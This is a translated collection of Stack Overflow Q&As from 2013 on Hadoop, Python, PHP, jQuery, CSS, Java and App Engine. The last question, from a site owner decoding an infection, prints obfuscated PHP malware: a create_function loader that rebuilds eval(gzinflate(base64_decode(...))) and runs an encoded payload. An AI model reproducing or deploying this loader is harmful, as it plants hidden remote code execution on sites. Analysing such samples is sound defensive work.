PDO 使两个不同 DBMS 之间的迁移更容易。有些人还将它用于支持 PDO 支持的所有 DBMS 的应用程序。但请注意，这通常是一种错误的做法：如果您不太了解某个软件，您不应该对您的用户说您支持它，因为您会撒谎——因为您无法解决现实生活中的问题。

mysqli 不是抽象。它是一个快速可靠的 MySQL api，应该是首选。

# hadoop - 使用不同的 hadoop-mapreduce-client-core.jar 运行 hadoop 集群

> ID：16204222
> 
> 赞同：1
> 
> 时间：2013-04-24T23:59:00.830
> 
> 标签：hadoop, jar, java-opts

我正在使用安装了 CDH4.2.0 的 hadoop 集群并遇到[此](https://issues.cloudera.org/browse/DISTRO-461)错误。它已在更高版本的 hadoop 中修复，但我无权更新集群。有没有办法告诉hadoop在通过命令行参数运行我的工作时使用这个jar

```
hadoop jar MyJob.jar -D hadoop.mapreduce.client=hadoop-mapreduce-client-core-2.0.0-cdh4.2.0.jar 
```

其中新的 mapreduce-client-core.jar 文件是票证中的修补 jar。还是必须用这个新 jar 完全重新编译 hadoop？我是 hadoop 新手，所以我不知道所有可能的命令行选项。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:55:07.603

我不确定当您执行`hadoop`实际上是在客户端 jar 中执行代码的命令时，它会如何工作。

不能用MR1吗？这个问题说这个问题只在你使用 MR2 时发生，所以除非你真的需要 Yarn，否则你最好使用 MR1 库来运行你的 map/reduce。

# python - 迭代循环

> ID：16204223
> 
> 赞同：0
> 
> 时间：2013-04-24T23:59:01.060
> 
> 标签：python, for-loop

```
alpha = [0,1,2,3,4,5,6,7,8,9]

for a in alpha:
    for b in alpha:
        for c in alpha:
            for d in alpha:
                print str(a) + str(b) + str(c) + str(d) 
```

上面的代码将生成 0000 到 9999 之间的所有数字。但是，我不喜欢代码的结构方式。假设我想这样做以产生最大十位数的数字；这将需要 10 个**for 循环**。是否有另一种方法可以实现相同的结果，而不必插入无数的***for 循环***？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T00:02:58.640

显而易见的方式：

```
for i in xrange(10000):        # or range if python 3
    print "{0:04d}".format(i) 
```

您还可以将 with 指定为参数：

```
for i in xrange(10000):        # or range if python 3
    print "%0*d"%(4,i) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T00:01:30.650

我不确定你是想要[`combinations_with_replacement`](http://docs.python.org/2/library/itertools.html#itertools.combinations_with_replacement)还是[`product`](http://docs.python.org/2/library/itertools.html#itertools.product). 我认为是后者，但是……用 2 或 3 试试它们，看看你要的是哪一个。

```
for combination in itertools.combinations_with_replacement(alpha, 3):
    print ''.join(map(str, combination))

for element in itertools.product(alpha, repeat=3):
    print ''.join(map(str, element)) 
```

虽然我可能会从字符串中生成组合，而不是从整数中生成它们只是为了将它们转换为字符串：

```
alpha = '0123456789'
for combination in itertools.combinations_with_replacement(alpha, 4):
    print ''.join(combination) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T00:02:02.733

```
expect_len = 10
max_val = 10**expected_len -1
my_list = ["%0*d"%(expect_len,val) for val in xrange(0,max_val+1)] 
```

我认为至少

# php - 多个单选按钮和两个单独的“提交”按钮，其中逻辑将根据所选选项流动

> ID：16204225
> 
> 赞同：0
> 
> 时间：2013-04-24T23:59:05.760
> 
> 标签：php, forms, radio-button, submit, submit-button

我正在尝试创建一个“谢谢”页面，用户在他/她选择了我们的一种形式后登陆该页面。在该页面上，用户可以选择免费 CD 作为礼物，并且只需支付运费。我想给用户一个选项来选择物理 CD 或数字 MP3。这里的逻辑是，首先我为用户提供了我连接到每个单选按钮的 4 张 CD 的选择。然后在下面会有第一个*提交*按钮，上面写着“是的，请邮寄一张 CD”。在第一个按钮下方会有第二个*提交*按钮，上面会显示类似“将下载链接发送给我”之类的内容。因此，如果用户单击任何单选按钮，然后单击第一个*提交*按钮，他们将被带到该 CD 的购物车，并提示他们支付 CD 的运费。如果用户点击同一个单选按钮，然后点击第二个*提交*按钮，他们将被带到链接下载它。如果用户选择退出此优惠，下面的第三个链接只会将用户带到该页面。

我无法让脚本为我正常工作。这是我到目前为止所拥有的：

```
<?PHP

$option1 = 'unchecked';
$option2 = 'unchecked';
$option3 = 'unchecked';
$option4 = 'unchecked';

if (isset($_POST['Submit1'])) 

        {

    $selected_radio = $_POST['cd_choice'];

        if ($selected_radio == 'option1') 
        {
            $option1 = 'checked';
                     ?>
                      <a href="#">Purchase link 1</a>
                     <?php

        }
        else if ($selected_radio == 'option2') 
        {
        $option2 = 'checked';
                     ?>
                      <a href="#">Purchase link 2</a>
                     <?php          
        }
        else if ($selected_radio == 'option3') 
        {
        $option3 = 'checked';
                     ?>
                      <a href="#">Purchase link 3</a>
                     <?php          
        }
        else if ($selected_radio == 'option4') 
        {
        $option4 = 'checked';
                     ?>
                      <a href="#">Purchase link 4</a>
                     <?php          
        }
    }
else
    {
    $selected_radio = $_POST['cd_choice'];

        if ($selected_radio == 'option1') 
        {
         $option1 = 'checked';
                     ?>
                      <a href="#">Download link 1</a>
                     <?php          
        }
        else if ($selected_radio == 'option2') 
        {
         $option2 = 'checked';
                     ?>
                      <a href="#">Download link 2</a>
                     <?php          
        }
        else if ($selected_radio == 'option3') 
        {
         $option3 = 'checked';
                     ?>
                      <a href="#">Download link 3</a>
                     <?php          
        }
        else if ($selected_radio == 'option4') 
        {
         $option4 = 'checked';
                     ?>
                      <a href="#">Download link 4</a>
                     <?php          
        }
    } 
?> 
```

这是我对它的 HTML 部分的内容：

```
<body>

<FORM NAME ="form1" METHOD ="POST" ACTION ="radioButton_test.php">

  <INPUT TYPE = 'Radio' Name ='cd_choice'  value= 'option1' <?PHP print $option1; ?>>
  This is the first CD
  <INPUT TYPE = 'Radio' Name ='cd_choice'  value= 'option2' <?PHP print $option2; ?>>
  This is the second CD
  <INPUT TYPE = 'Radio' Name ='cd_choice'  value= 'option3' <?PHP print $option3; ?>>
  This is the third CD
  <INPUT TYPE = 'Radio' Name ='cd_choice'  value= 'option4' <?PHP print $option4; ?>>
  This is the fourth CD
<P>
<center><INPUT TYPE = "Submit" Name = "Submit1"  VALUE = "Yes, please mail me a CD"></center>
<p><center><INPUT TYPE = "Submit" Name = "Submit2"  VALUE = "Send me download link instead"></center></p>
<div align="center"><a href="#">No thanks. </a></div>
</FORM> 
```

任何帮助将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T04:33:48.113

我冒昧地清理了你的 HTML——现在 HTML 通常是小写的——但基本上你可以根据使用 JavaScript 轻松单击哪个按钮来更改表单的操作：

```
<form name="form1" id="form1" method="POST" action="radioButton_test.php">
   <center><input type="Submit" name="Submit1" value="Yes, please mail me a CD" onclick="this.form.action='test1.php';alert(this.form.action);"></center>
   <p><center><input type="Submit" name="Submit2" value="Send me download link instead" onclick="this.form.action='test2.php';alert(this.form.action);"></center></p>
</form> 
```

您需要将表单名称“test1.php”和“test2.php”更改为您的实际 php 脚本名称并删除`alert(this.form.action);`代码，但这应该可以满足您的需求。

或者，如果您想回发到您的同一个脚本，您可以只检查提交按钮的值。您单击的提交按钮将在帖子中传递，而另一个则不会。

```
if ( !empty($_POST['Submit1']) ) 
```

或者

```
if ( isset($_POST['Submit1']) ) 
```

或者

```
if ( isset($_POST['Submit1']) && $_POST['Submit1'] == 'Yes, please mail me a CD' ) 
```

# javascript - 如何动画浏览器屏幕的移动？

> ID：16204227
> 
> 赞同：0
> 
> 时间：2013-04-24T23:59:21.177
> 
> 标签：javascript, jquery

使用以下表达式，浏览器屏幕会立即移动到元素。

```
jQuery(document).scrollTop( jQuery("#myelement").offset().top-500 ); 
```

我怎么能做同样的事情，但是通过速度来动画运动的效果？以下表达式不起作用。

```
jQuery(document).scrollTop( jQuery("#myelement").offset().top-500 ).slow(); 
```

谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T05:14:44.703

无论如何它是这样工作的

```
jQuery(window.opera ? 'html' : 'html, body').animate({scrollTop: jQuery("#myelement").offset().top-500}, 1500, 'linear'); 
```

# python - 在 Python 中从父/子列表中构建树

> ID：16204230
> 
> 赞同：2
> 
> 时间：2013-04-25T00:00:04.920
> 
> 标签：python, algorithm, tree

使用 Python，我有一个字典对象列表，其中包含彼此之间的父/子关系，我想将其构建到树中。例如：

```
{'UI': 'T071', 'NAME': 'Entity', 'PARENT': None, 'CHILDREN': 'Conceptual Entity'}
{'UI': 'T077', 'NAME': 'Conceptual Entity', 'PARENT': 'Entitity', 'CHILDREN': 'Organism Attribute, Finding, Idea or Concept'}
{'UI': 'T032', 'NAME': 'Organism Attribute', 'PARENT': 'Conceptual Entity', 'CHILDREN': 'Clinical Attribute'}
etc. 
```

数据集中共有 4 个根节点（'PARENT' 设置为 None），它们构成 4 个独立的树。所以，我打算做一个树的清单。

数据不一定按任何顺序排列（因此层次结构较高的节点不一定在列表中较高）。此外，id 的（UI）没有特定的顺序（T071 在树中不一定比 T072 高）。它们的名称是唯一的，数据集使用它们的名称而不是 id (UI) 来显示关系。

我有这个简单的课程：

```
class node():
    def __init__(self, value):
        self.value = value
        self.children = []

    def add_child(self, obj):
        self.children.append(obj) 
```

我对如何处理这个问题有点困惑。建议非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:27:01.410

我认为最好是做两遍。首先，您创建一个将名称链接到节点的字典。然后你可以有效地添加你的项目。

我的代码：

```
nodes = dict((e["NAME"], node(e)) for e in l)
for e in l:
    if e["PARENT"] is not None:
        nodes[e["PARENT"]].add_children(nodes[e["NAME"]) 
```

如果你想要根，你可以使用上面的 if，或者你可以过滤节点。

```
roots = [n for n in nodes.values() if d.value["PARENT"] is None] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T02:53:02.267

我曾经用一个 dict 表示一个 *ix 进程树，以及每个父 pid 的子进程 pid 列表。所以你得到：

```
dict_[1] = [2, 3, 4]
dict_[2] = [5, 100]
dict_[3] = [6, 200]
dict_[4] = [7, 300]
dict_[6] = [400] 
```

它似乎工作得很好。

您是否希望叶节点与空列表一起存在，或者只是不出现在树中，这是可选的。我已经在上面展示了它们没有出现在字典级别的树中。

我相信这仅在 pid（节点）只能出现在树中的一个位置时才合适。例如，100 不能是 2*和*4 的孩子。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2021-05-12T08:26:04.547

代码渗透到字典树多达 5 个级别。当到达某个对象时，它会检查它是否为 numpy。如果是，它会打印它的形状。如果不是，则写入对象的类型。通过选择“级别”，它可以确定树应该走多深。当前的实现深度可达 5 级。

```
def tree_view_dict(d, level=999):
    for key in d.keys():
        print('|')
        print(key, end = '')
        if isinstance(d[key], dict) and level > 1:
            print()
            for key2 in d[key].keys():
                print('|__', key2, end = '')
                if isinstance(d[key][key2], dict) and level > 2:
                    print()
                    for key3 in d[key][key2]:
                        print('   |__', key3, end = '')
                        if isinstance(d[key][key2][key3], dict) and level > 3:
                            print()
                            for key4 in d[key][key2][key3]:
                                print('     |__', key4, end = '')
                                if isinstance(d[key][key2][key3][key4], dict) and level > 4:
                                    print()
                                    for key5 in d[key][key2][key3][key4]:
                                        print('       |__', key5, end = '')
                                else:
                                    print(': ', d[key][key2][key3][key4].shape if type(d[key][key2][key3][key4]).__module__ == 'numpy' else type(d[key][key2][key3][key4]))
                        else:
                            print(': ', d[key][key2][key3].shape if type(d[key][key2][key3]).__module__ == 'numpy' else type(d[key][key2][key3]))
                else:
                    print(': ', d[key][key2].shape if type(d[key][key2]).__module__ == 'numpy' else type(d[key][key2]))
        else:
            print(': ', d[key].shape if type(d[key]).__module__ == 'numpy' else type(d[key]))
    pass 
```

```
 d = {'UI': 'T032', 'NAME': 'Organism Attribute', 'PARENT': 'Conceptual Entity', 'CHILDREN': {'CHILDREN_array': np.array([[1,2], [3,4]]),'CHILDREN_name': 'name'}}
tree_view_dict(d, level=5) 
```

结果，

```
 |
UI:  <class 'str'>
|
NAME:  <class 'str'>
|
PARENT:  <class 'str'>
|
CHILDREN
|__ CHILDREN_array:  (2, 2)
|__ CHILDREN_name:  <class 'str'>``` 
```

# java - 以毫秒为单位从 JodaTime 获取 ISO8601

> ID：16204231
> 
> 赞同：3
> 
> 时间：2013-04-25T00:00:08.847
> 
> 标签：java, date, timezone, jodatime, iso8601

我想将我的日期转换`"2013-03-04T23:00:00"`为，`"yyyy-MM-dd'T'HH:mm:ss.SSSZ"`但我不断得到`"2013-03-04'T'23:00:00.000+0000"`. 有什么帮助吗？

顺便说一下，item.getEnd() 是一个 XMLGregorianCalendar。

```
Calendar calendar  = item.getEnd().toGregorianCalendar();
calendar.setTimeZone(TimeZone.getTimeZone("UTC"));

Date date = calendar.getTime();
DateTime iso8601 = new DateTime(calendar);

iso8601.toString("yyyy-MM-dd'T'HH:mm:ss.SSSZ"); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:56:50.567

您应该能够使用`ISODateTimeFormat`内置于 JodaTime 的类。[文档](http://joda-time.sourceforge.net/apidocs/org/joda/time/format/ISODateTimeFormat.html)中的示例是：

```
DateTime dt = new DateTime();
DateTimeFormatter fmt = ISODateTimeFormat.dateTime();
String str = fmt.print(dt); 
```

# c# - 实体框架延迟几秒钟保存？

> ID：16204232
> 
> 赞同：1
> 
> 时间：2013-04-25T00:00:24.063
> 
> 标签：c#, entity-framework

我有这个问题。

C#, 视觉工作室 2010

在我拥有的系统中，我添加、更新，例如，如果我添加一个帐户并执行选择（使用实体框架），则返回成功。

现在我已经看到了。如果我添加了一个帐户并且保存成功并且我停止了项目这个帐户没有保存，所以我需要在保存更改后停留 10 秒，这是用于添加或更新对象

为什么实体框架需要这种延迟？为什么我做 SaveChanges() 时没有插入它；

我可以消除这个延迟吗？

我正在使用 sdf 文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T07:24:01.697

我不认为问题出在连接上。

1.) 在 EF 中，在执行查询之前，它将为数据库生成本地查询视图，这可能需要一些时间，但只是第一次。您可以在 MSDN 的以下链接中检查相同的内容。

[预生成视图以提高查询性能]

[http://msdn.microsoft.com/en-us/library/bb896240.aspx](http://msdn.microsoft.com/en-us/library/bb896240.aspx)

2.) 您使用的紧凑型 SQL 可能需要加载一些在您的项目中未引用的库。因此，每当您执行保存时，它可能每次都被加载，这可能需要一些时间来执行保存。在项目的引用中添加所需的 Dll 并尝试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:17:12.057

> 我找到了为什么会发生这种情况，这是有必要在 SaveChanges() 之后关闭连接并且更改（添加或更新或删除）将立即保存但如果我不关闭连接，则更改将在 10 或之后保存15 秒。

# java - 在 GWT 中将对象序列化为字符串

> ID：16204234
> 
> 赞同：1
> 
> 时间：2013-04-25T00:00:37.180
> 
> 标签：java, gwt, serialization

我在 GWT 中有一些对象，我想将它们作为字符串存储在客户端，最后获取它们，将其解密为实际对象，然后对其进行必要的处理。任何人都可以建议一种方法吗？我在 Google 中找不到太多关于此的文档，SO 中的一两个类似问题也没有提供令人满意的答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T03:46:56.017

[`AutoBean`](https://code.google.com/p/google-web-toolkit/wiki/AutoBean)应该能够做你想做的事。它使您的 Java 中的 JSON 可以通过 HTTP 请求发送并在另一端转换回 Java 对象。当您可以使用 RPC 时使用它很好。

# html - 为什么正确缩进时此 HTML 呈现不同？

> ID：16204235
> 
> 赞同：4
> 
> 时间：2013-04-25T00:00:49.523
> 
> 标签：html, css

我有一个样式为表格导航的无序列表，需要如下所示![选项卡示例](https://i.stack.imgur.com/aEj6T.png)：为了给选项卡圆角，每个选项卡都有左侧、中间和右侧`div`以及各自的 css 背景*。

* * *

当我像这样（[jsFiddle](http://jsfiddle.net/backus/EXCBZ/)）格式化列表项时：

```
<li class="tab">
    <div class="item-wrap"><span class="item-before"></span><span class="item"><a href="inventories">Inventory</a></span><span class="item-after"></span></div>
</li> 
```

我得到了想要的结果：![正确渲染的结果](https://i.stack.imgur.com/6Hp6k.png)

但是当我格式化 HTML 以使其更具可读性时，就像这样（[jsFiddle](http://jsfiddle.net/backus/F9dCP/1/)）：

```
<li class="tab">
  <div class="item-wrap">
    <span class="item-before"></span>
    <span class="item">
      <a href="inventories">Inventory</a>
    </span>
    <span class="item-after"></span>
  </div>
</li> 
```

渲染变化：![渲染结果不正确](https://i.stack.imgur.com/tBLwe.png)

到底是怎么回事？

* * *

***注意**：我知道这种方法已经过时了。[我为之构建](http://www.stanford.edu/~ouster/cgi-bin/cs142-spring13/project.php?project=1)的类将我们限制为 HTML 4 和 CSS 2。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:18:26.500

我无法完全解释它，但它与`a`元素周围的空白有关......

这正确呈现...

```
<span class="item"><a href="inventories">Inventory</a></span> 
```

这不...

```
<span class="item"> <a href="inventories">Inventory</a> </span> 
```

`a`因此，重新格式化 HTML 会在元素周围引入空格。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T02:33:49.640

[W3](http://www.w3.org/TR/html401/struct/global.html#h-7.5.3)教我们：

> 默认情况下，块级元素的格式不同于内联元素。通常，块级元素从新行开始，而行内元素则不然。有关空格、换行符和块格式的信息，请参阅[文本](http://www.w3.org/TR/html401/struct/text.html)部分。

在引用的链接中

> 对于除 PRE 之外的所有 HTML 元素，空格序列分隔“单词”（我们在这里使用术语“单词”来表示“非空格字符的序列”）。在格式化文本时，用户代理应该识别这些词，并根据特定的书面语言（脚本）和目标媒体的约定对它们进行布局。

所以基本上，由于您的元素默认为内联元素，因此您的标签被视为“单词”，因此在呈现文本时标签之间的空格**确实很重要。**

基本上，此时，您可能不想要两件事：

1.  将所有代码写在一行中
2.  使用额外的 CSS 能够将标签放在单独的行中

好吧，至少我不想要这个。这就是我使用[haml](http://haml.info/)生成HTML 的原因。像许多 HTML 模板引擎一样，它[允许您处理标签之间的空格，而无需重新缩进代码](http://haml.info/docs/yardoc/file.REFERENCE.html#whitespace_removal__and_)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T00:14:46.880

浏览器将换行符视为空格（如文字空格字符）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-25T00:56:27.320

HTML 将多个空白字符压缩到一个空格中，这已不是什么秘密。

然而，鲜为人知的是该空间属于什么元素。

考虑这个 HTML：`<b> <i> spaces!</i></b>`

元素周围的两个空间`i`将被压缩，但生成的空间是在它里面还是外面？

当您有不同的缩进时，这种差异是导致您的 HTML 呈现不同的原因。

就个人而言，我喜欢使用 PHP 来回显这样的 HTML，所以我可以在源代码的多行中使用它，但只输出一行 HTML：

```
<?php
echo "<span>"
    ."Hello, world!"
  ."</span>";
?> 
```

结果是：

```
<span>Helld, world!</span> 
```

# javascript - 如何使元素位置固定但也离开窗口？

> ID：16204237
> 
> 赞同：4
> 
> 时间：2013-04-25T00:00:52.943
> 
> 标签：javascript, html, css

假设我在浏览器窗口中有一个正确的菜单：

```
___________________________
                   | Right |
        content    | Menu  |
                   |       |
                   |       |
                   |       |
                   |       |
                   |       |
                   |       |
                   |       |
___________________|_______| 
```

我希望修复菜单，以便用户在向下滚动时看到相同的内容。所以我为右边的菜单设置了位置：固定。

但是，如果窗口太小，我也希望菜单不可见。即窗口应该在右菜单之前显示全部内容。

像这样：

```
_________________________
                   | Ri |
        content    | Me |
                   |    |
                   |    |
                   |    |
                   |    |
                   |    |
                   |    |
                   |    |
___________________|____| 
```

有没有办法在纯 CSS 中做到这一点？如果没有，一个非常简单的 js 修复？

编辑：

我有一个相关的问题，所以我觉得不需要创建另一个问题：

我有一个固定的右侧菜单宽度，但我需要左侧内容来相应地自动调整其宽度（填充左侧）。有没有办法在 css 中做到这一点并保留上述功能？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:03:19.327

如果您知道内容的尺寸，则可以改用以下内容：

```
position:fixed; left:800px; 
```

而不是：

```
position:fixed; right:0; 
```

如果说您的内容是 800px 宽。这意味着您的计算是从左侧进行的，如果用户窗口小于该菜单，菜单将退出屏幕。

### 更新

看来您的要求如下：

*   您有一个指定了最小宽度的内容区域。
*   您需要您的菜单与用户一起滚动。
*   您需要将菜单显示在右侧，直到菜单占用内容的最小宽度。

我建议使用 JavaScript 来解决这个问题，你可以在纯 CSS 中实现它，但通过将菜单放置在覆盖整个页面的固定层中。虽然这里的逻辑在现代浏览器中有效——由于 z-indexing 菜单容器上方的内容——我不想看到旧的用户代理会怎么做：

### 纯css版本

**css**

```
/* make sure our content doesn't collapse too small */
.content { 
  position: relative;
  z-index: 20;
  min-width: 700px;
  margin-right: 200px;
}
/* place our menu container across the entire page */
.menu-container {
  position: fixed;
  z-index: 10;
  left: 0;
  right: 0;
  top: 0;
  bottom: 0;
}
/* a layer that mimics what our content does */
.menu-offset  {
  position: relative;
  min-width: 700px;
  margin-right: 200px;
  height: 100%;
}
/* finally the menu attached to the right of the menu offset */
.menu-content { 
  position: absolute;
  width: 200px;
  height: 100%; 
  left: 100%;
  background: #ddd;
} 
```

**标记**

```
<div class="content">
  <p>
  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis 
  adipiscing magna sed ipsum convallis vel fringilla nibh viverra.
  Nulla et ligula vel urna scelerisque imperdiet a et lectus.
  Nunc commodo, nibh id blandit mollis, leo quam eleifend urna,
  at rhoncus turpis justo sit amet erat. Quisque tempus nunc 
  vitae eros fringilla eget imperdiet neque tincidunt. Donec 
  ac posuere diam. Nam nibh nibh, sollicitudin non blandit ut, 
  auctor in dolor. Nullam lobortis condimentum consequat. 
  </p>
  <p>
  Maecenas at orci massa, quis congue mauris. Vivamus varius 
  tincidunt nunc, eget <a href="#canyouclickthis">pellentesque arcu 
  faucibus</a> ac. Suspendisse rhoncus orci eu felis consectetur 
  rutrum. Nullam sed mauris eros. Nunc dignissim, libero dapibus 
  consectetur lobortis, ante urna faucibus dui, vel luctus metus 
  leo id magna. Pellentesque mi ligula, commodo ac pellentesque 
  et, auctor sed neque. Phasellus dapibus tellus faucibus dui 
  vehicula hendrerit. Pellentesque habitant morbi tristique 
  senectus et netus et malesuada 
  fames ac turpis egestas.
  </p>
</div>
<div class="menu-container">
  <div class="menu-offset">
    <nav class="menu-content">Menu</nav>
  </div>
</div> 
```

有了上述内容，我希望旧版浏览器要么呈现，因此您将无法与内容 div 中的任何内容进行交互——请参阅`#canyouclickthis`链接——或者`position:fixed`无论如何都不能正确支持：

[http://caniuse.com/css-fixed](http://caniuse.com/css-fixed)

### 更新 2

啊，刚刚发现你关于`80%`宽度的评论。对上述内容的修改可能适用于此，但是，当您有一个固定宽度的菜单时（尤其是在您指定的条件下），最好避免使用百分比宽度，并改用 min 和 max-width。要么使用具有百分比宽度而不是固定的菜单。

根据您拥有/希望设置标记的方式，以下可能有效。这种方法依赖于这样一个事实，即如果您不指定`left`, `top`，`bottom`或者`right`图层应该保留在它所在的位置（在旧浏览器中不是 100% 正确）。您可能会发现您必须`.menu`为不太现代的 UA 定义层的尺寸。该解决方案的另一个好处是不覆盖固定层中的整个页面:)

```
.content        { position:relative; width:80%; min-width: 800px; float:left; }
.menu-container { position:absolute; left:100%; top:0; }
.menu-content   { position: fixed; width:20%; height:100%; background:#ddd; }

<div class="content">
  <p>
  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis 
  adipiscing magna sed ipsum convallis vel fringilla nibh viverra.
  Nulla et ligula vel urna scelerisque imperdiet a et lectus.
  Nunc commodo, nibh id blandit mollis, leo quam eleifend urna,
  at rhoncus turpis justo sit amet erat. Quisque tempus nunc 
  vitae eros fringilla eget imperdiet neque tincidunt. Donec 
  ac posuere diam. Nam nibh nibh, sollicitudin non blandit ut, 
  auctor in dolor. Nullam lobortis condimentum consequat. 
  </p>
  <div class="menu-container">
    <nav class="menu-content">Menu</nav>
  </div>
</div> 
```

同样，最好在 Internet Explorer 中测试它，因为我无法访问那个特定的用户代理 atm。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T00:39:36.863

对于问题的第二部分，给`content`元素一个`margin-right`或`padding-right`等于菜单宽度

所以

```
.menu{
   position:fixed;
   top:0;
   bottom:0;
   right:0;
   width: 240px; /*the fixed width you want*/
}

.content{ /*assuming there is a wrapper element*/
   margin-right:240px; /*same as fixed width of menu*/
} 
```

演示在[http://jsfiddle.net/gaby/MMnhZ/](http://jsfiddle.net/gaby/MMnhZ/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T00:44:05.717

使用 jQuery，您可以计算窗口的宽度和内容的宽度，然后将其分配给菜单的左侧值。

```
var leftPosition = ($('#wrapper').width() / 2 ) + ($(window).width() / 2);

$('#menu').css("left", leftPosition); 
```

使用 $(window).resize(); 如果窗口发生变化，则重新计算它。添加 if/else 语句以确保它保持在一定数量之上并且您已设置好。

这是一个[显示结果的 jsFiddle](http://jsfiddle.net/yhyEJ/2/embedded/result/)

# python - 在 AppEngine 中使用 gdata 获取域的所有用户名

> ID：16204239
> 
> 赞同：0
> 
> 时间：2013-04-25T00:01:11.037
> 
> 标签：python, google-app-engine, gdata, google-provisioning-api

我刚刚开始使用 python 学习 AppEngine，在我的项目中我正在构建一个应用程序，我需要在其中检索我域的所有用户。

我使用`RetrieveAllOrgUsers`and`RetrieveAllUsers`来获取我域的用户，但是当我在我的 AppEngine 帐户上部署应用程序时，它们都崩溃了。我得到错误`deadlineexceeded`。

有人可以帮我解决这个问题吗？我想也许我需要使用任务，但我不知道如何。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:24:40.130

您应该花一些时间阅读有关您所使用平台的限制的信息。

您是否了解 DeadelinExceededError 的含义/原因。

那应该是你的起点。

还可以查看日志中的堆栈跟踪，您将看到代码中发生错误的位置。

基本上，您在前端请求中做事的时间是有限的。如果超过那个时间，那么你会得到这个错误（还有其他原因）。

我假设您使用的是配置 api，这可能需要花费一些时间。您还需要应对其他限制，例如 URLFetch 周围的限制。

任务很可能是您的解决方案，但您应该在开始之前尝试了解原因。

阅读[https://developers.google.com/appengine/articles/deferred](https://developers.google.com/appengine/articles/deferred)，这是使用 deferred 执行任务的简单途径。

# php - 最好的解码方法？

> ID：16204244
> 
> 赞同：0
> 
> 时间：2013-04-25T00:01:31.583
> 
> 标签：php, base64, eval, decode

所以我才发现自己被这个恶意代码感染了。它看起来像“eval（gzinflate（base64_decode”），但我在任何地方都找不到base64，它看起来像这样

```
<?php
$md5 = "89e17508d2ddfa94b9c1f45918963218";
$a0 = array("r",')',"6",'_','s',"g","e","l",'z',';','a',"b",'d',"v",'$',"t",'n',"o",'(',"i","c",'4',"f");
$b0c = create_function('$'.'v',$a0[6].$a0[13].$a0[10].$a0[7].$a0[18].$a0[5].$a0[8].$a0[19].$a0[16].$a0[22].$a0[7].$a0[10].$a0[15].$a0[6].$a0[18].$a0[11].$a0[10].$a0[4].$a0[6].$a0[2].$a0[21].$a0[3].$a0[12].$a0[6].$a0[20].$a0[17].$a0[12].$a0[6].$a0[18].$a0[14].$a0[13].$a0[1].$a0[1].$a0[1].$a0[9]);
$b0c('DZa3DqwIEkU/Z94TAd5pNAHem8ZDssKbxnv4+u2k4pLOrVunPNP+T/22Y9Wne/knS7eSwP5XlPlUlH/+4ZNEXDdf2b5uBMHRcwkvQUxSMnjwPKRAklcRqLuSbXxxoQgj3qbQyDvDj1z4YJklEWun4Nauw3auo42+y2UoSeq/bOg4MVLc43BMZcUkCxAnZ+XhFhQj5CLXaciHV9QbCAjcLbuYVBd8SQao6AHIVgBtKUHtLOUzEuonkmVSStiGu2xUemMPaOu9yaWIkmApmQ+FTD/MFJHYa/qyYw6WYshD7V/NDR87ebMcGTlaZ0p5AMufS3fcbg55fs4C4O73EMwbvqA3MsiPAglaAtJiR4Tl199hwKStaMaayEoQyRHNO5dzn/SlTB4IF7HIEVchSPMBY+WmEaMN7dxRK5QJU2c/1zQOv7mxD6SOPMgT0LvA7rdA+VWtd2qVgLl5d0Fwd/aF/CWEYFHBlwrIO9apc7MG0OGGZdCJUjb61DTk3S/lrr6eNFe/aJA9vCeFQydmmCw6ZR7KyGaxIDnEKLovwuq5MuIiWBnSAt/CCHKn8QwKGnhdr7AkQIApFt55BmnZMBFKdafDKInP99zqod+us7zG3uHc8/JYpG0qQ3cNq7E+m0VWjDPTsu+WyBvctcwTGmBo38e5jFI8xBBTt7nmWSdPvDiGygIfv274Mp4eeUl4liSkrHtwhdY7JEGcplvrpcCSscpWKWzjXYfwyt9jiQiYHX1H2aCQlxwfzjq7onXWVDiGhUzBsrvcItBquaBGdOGxG3Rg6XALH4pSHViifmgpDDb+28dHhZBwdWN1lK0zSZOp5KUZtu3gRjCftgiMG9TWZBvQHWz42gSdSgrPQPqRvJyOrxqSUg91cdd05n5JPWAhkczzRof4CDiG2VwJOYuJkgw6Kw4Vhd2zu+S+sZIAvgPFJIrCOU/EJyrZxAxPb8Jd3Gm2nufpUYwJ2Bfi+y1dkOOEz55AfU6kSUJxp8bduKXDF6rdH2DdLB+bipHorLGMtcDD7FqkI351VK64YxDJl8CJ2czSID2uJOY21D4zrRM9sAv15w6Gz2JAMqSijBCDsDlFyVJn4Gxh6oNto9Y1Umx8Y2e5TBSfQbieUerZYU4tfVFZIzNTwxbYxMzfbgBw73elZBMEhrgcstSktxXUPryEskNtScgrEEoNfbEGsOwS2tBQlL5YJwRbv+/F/pAi9zDjES5z9BC42tG4YRFSxQ1v0t9iT7VKc9629om6WcRrStW5GxGHDYxlHfKlhYY24WaRhpJOrg3kLcXm1nuXnmgdmJA28wncPlo28Qth0iD1XyrYr9ztDWI5uvjp1AXjZpjG9F6r5seFYUiC5fz42Ce0BYbBbh5hTbhJpAYBkY/ry/ki/Yoj5Bw3F04NTo+F9MgzRYG7Eg6rDTAwuTAV